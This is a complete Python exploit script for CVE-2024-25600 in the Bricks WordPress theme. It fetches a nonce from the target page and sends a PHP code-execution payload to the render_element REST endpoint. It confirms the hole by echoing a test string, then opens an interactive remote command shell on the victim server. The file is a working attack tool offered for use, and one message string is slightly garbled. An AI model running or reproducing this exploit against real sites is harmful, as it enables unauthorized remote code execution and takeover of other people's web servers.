import requests  # Used for making HTTP requests
import re  # Used for regular expression matching
import argparse  # Used for parsing command-line arguments
import urllib3  # Used for handling HTTP connections
from prompt_toolkit import PromptSession, HTML  # Used for creating an interactive shell
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory  # Used for auto-suggestion in the shell
from prompt_toolkit.history import InMemoryHistory  # Used for storing shell history in memory
from bs4 import BeautifulSoup  # Used for parsing HTML content
from rich.console import Console  # Used for rich text and formatting in the console
from rich.table import Table  # Used for creating tables in the console
from rich.panel import Panel  # Used for creating panels in the console

# Disable warnings about SSL certificate for HTTPS connections
urllib3.disable_warnings()

TEST_STRING = "justtesting"  # Test string used to check vulnerability
console = Console()  # Console object for rich text output

# Headers for HTTP requests
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
}

endpoint = "/wp-json/bricks/v1/render_element"  # API endpoint for the exploit

def fetch_nonce(url):
    """
    Fetch the nonce value from the target URL.
    The nonce is required for making authenticated requests.
    """
    try:
        with console.status("Fetching source code...", spinner="dots"):
            # Send a GET request to the target URL to retrieve the source code
            response = requests.get(url, verify=False, timeout=20)
            response.raise_for_status()
        if response.status_code == 200:
            # Parse the HTML content using BeautifulSoup
            soup = BeautifulSoup(response.text, "html.parser")
            # Find the script tag with id "bricks-scripts-js-extra"
            script = soup.find("script", id="bricks-scripts-js-extra")
            if script and script.string:
                # Regular expression pattern to find the nonce value
                pattern = r'"nonce":"([a-zA-Z0-9]+)"'
                # Search for the nonce in the script content
                matchObj = re.search(pattern=pattern, string=script.string)
                nonce = matchObj.group(1) if matchObj else ""
                return nonce
    except requests.HTTPError as e:
        console.print(f"[red]An HTTP error occurred while fetching nonce: {e}[/red]")
        return ""
    except Exception as e:
        console.print(f"[red]An error occurred while fetching nonce: {e}[/red]")
        return ""

def create_vulnerable_data(nonce, command=f"echo {TEST_STRING}"):
    """
    Create the JSON data payload for the exploit.
    This payload includes the nonce and the command to be executed.
    """
    return {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "code",
            "settings": {
                "executeCode": "true",
                "code": f"<?php throw new Exception(`{command}`);?>"
            }
        }
    }

def send_request(url, data, timeout=20):
    """
    Send a POST request to the target URL with the given data.
    """
    try:
        with console.status("Sending request...", spinner="dots"):
            # Send the POST request with JSON data
            response = requests.post(
                url=url + endpoint,
                headers=headers,
                json=data,
                verify=False,
                timeout=timeout
            )
            response.raise_for_status()
        return response
    except requests.HTTPError as e:
        console.print(f"[red]An HTTP error occurred while sending POST request: {e}[/red]")
        return None
    except Exception as e:
        console.print(f"[red]An error occurred while sending POST request: {e}[/red]")
        return None

def is_target_vulnerable(url, data):
    """
    Check if the target is vulnerable by sending a test request.
    """
    try:
        response = send_request(url, data)
        if not response:
            return False
        if response.status_code == 200 and TEST_STRING in response.text:
            console.print("[green][+] The target is vulnerable to CVE-2024-25600 ![/green]")
            console.print(Panel(response.text, title="Response", border_style="cyan"))
            return True
        else:
            console.print("[yellow][-] The target does not appear to be vulnerable[/yellow]")
            return False
    except requests.HTTPError as e:
        console.print(f"[red]An HTTP error occurred while sending POST request: {e}[/red]")
        return False
    except Exception as e:
        console.print(f"[red]An error occurred while sending POST request: {e}[/red]")
        return False

def get_interactive_shell(url, nonce):
    """
    Start an interactive shell to execute commands on the target.
    """
    # Create a prompt session with auto-suggestion and history
    session = PromptSession(
        auto_suggest=AutoSuggestFromHistory(),
        history=InMemoryHistory()
    )
    console.print("[bold cyan]Welcome to the interactive shell![/bold cyan]")
    console.print("[yellow]Type 'exit' to quit, 'clear' to clear the screen.[/yellow]")

    while True:
        try:
            # Get user input with a colored prompt
            cmd = session.prompt(HTML("<ansigreen># </ansigreen>"))
            if not cmd.strip():
                continue
            match cmd.lower():
                case "clear":
                    console.clear()
                case "exit":
                    console.print("[bold cyan]Goodbye![/bold cyan]")
                    break
                case _:
                    try:
                        # Create the data payload with the user's command
                        data = create_vulnerable_data(nonce, cmd)
                        response = send_request(url, data, timeout=10)
                        if response and response.status_code == 200:
                            # Extract the command output from the response
                            output = response.json().get("data").get("html")
                            clean_output = output.replace("Exception: ", "")
                            console.print(f"[dim]Executed: {cmd}[/dim]")
                            console.print(Panel(clean_output, title="Command Output", border_style="green"))
                        else:
                            console.print("[red]Failed to execute command.[/red]")
                    except Exception as e:
                        console.print(f"[red]An error occurred: {e}[/red]")
        except KeyboardInterrupt:
            console.print("[bold cyan]Goodbye![/bold cyan]")
            break

def main():
    """
    Main function to run the exploit.
    """
    console.print(Panel("[bold magenta]CVE-2024-25600 Exploit[/bold magenta]", title="Exploit Script", border_style="magenta"))
    try:
        # Parse command-line arguments
        parser = argparse.ArgumentParser(
            description="Exploit for CVE-2024-25600 vulnerability"
        )
        parser.add_argument(
            "-u", "--url", help="Target URL to exploit"
        )
        args = parser.parse_args()
        URL = args.url

        if not URL:
            console.print("[yellow]Please provide a target URL using the -u or --url option.[/yellow]")
            exit(1)

        # Fetch the nonce from the target URL
        nonce = fetch_nonce(URL)
        if nonce:
            # Display target information in a table
            table = Table(title="Target Information")
            table.add_column("URL", style="cyan")
            table.add_column("Nonce", style="green")
            table.add_row(URL, nonce)
            console.print(table)
            console.print("Checking if the target is vulnerable...")
            # Create the test data payload
            data = create_vulnerable_data(nonce=nonce)
            # Check if the target is vulnerable
            is_vulnerable = is_target_vulnerable(url=URL, data=data)
            if is_vulnerable:
                console.print("[green]Preparing CÃ¢mara interactive shell...[/green]")
                # Start the interactive shell
                get_interactive_shell(URL, nonce)
    except Exception as e:
        console.print(f"[red]An error occurred in the main function: {e}[/red]")
        exit(1)

if __name__ == "__main__":
    main()